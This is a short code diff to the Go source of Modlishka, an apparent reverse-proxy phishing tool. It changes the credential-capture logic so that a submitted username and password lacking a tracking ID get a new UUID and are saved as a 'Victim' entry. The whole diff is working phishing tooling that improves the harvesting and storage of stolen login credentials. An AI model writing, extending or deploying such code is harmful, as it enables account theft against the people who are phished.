@@ -24,6 +24,7 @@ import (
 	"github.com/drk1wi/Modlishka/runtime"
 	"github.com/drk1wi/Modlishka/log"
 	"github.com/tidwall/buntdb"
+	"github.com/google/uuid"
 	"html/template"
 	"io"
 	"io/ioutil"
@@ -960,7 +961,12 @@ func init() {
 			}
 
 			if creds, found := CConfig.checkRequestCredentials(req); found {
-
+				// Someone submitted a username/password without a tracking ID
+				if context.UserID == "" {
+					newUUID, _ := uuid.NewRandom()
+					context.InitUserID = newUUID.String()
+					context.UserID = newUUID.String()
+				}
 				victim := Victim{UUID: context.UserID, Username: creds.usernameFieldValue, Password: creds.passwordFieldValue}
 				if err := CConfig.updateEntry(&victim); err != nil {
 					log.Infof("Error %s", err.Error())
